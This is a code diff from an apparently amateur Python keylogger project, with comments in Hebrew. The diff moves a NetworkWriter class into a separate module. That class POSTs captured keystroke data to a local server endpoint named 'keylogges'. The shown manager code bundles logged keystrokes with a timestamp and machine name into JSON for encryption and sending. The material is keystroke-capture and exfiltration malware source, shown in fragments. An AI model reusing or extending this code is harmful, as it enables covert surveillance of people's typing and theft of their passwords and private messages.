@@ -1,19 +1,20 @@
 from KeyLoggerService import KeyLoggerService 
 import   time, os, json, ast, requests
 from Enkryptor import Encryptor
+from NetworkWriter import NetworkWriter
 waiting_time = 6
 
 
-from iwriter import IWriter
-class  NetworkWriter(IWriter):
-    def __init__(self):        
-        super().__init__()
-    def send_data(self,data):
-        try:    
-            url = 'http://127.0.0.1:5000/api/keylogges'
-            response = requests.post(url,json=data)
-        except:
-               return None         
+# from iwriter import IWriter
+# class  NetworkWriter(IWriter):
+#     def __init__(self):        
+#         super().__init__()
+#     def send_data(self,data):
+#         try:    
+#             url = 'http://127.0.0.1:5000/api/keylogges'
+#             response = requests.post(url,json=data)
+#         except:
+#                return None         
 
 class KeyLoggerManager(KeyLoggerService):
     def __init__(self):
@@ -50,7 +51,6 @@ class KeyLoggerManager(KeyLoggerService):
                 jeson = {'time':time1,'data':list_to_send,'machine':machine}
                 if len(jeson['data']) == 0:
                             continue
-                # else:
                     #jsonהפיכת המילון ל    
                 jeson = json.dumps(jeson,ensure_ascii=False)
                     #jsonהצפנת ה
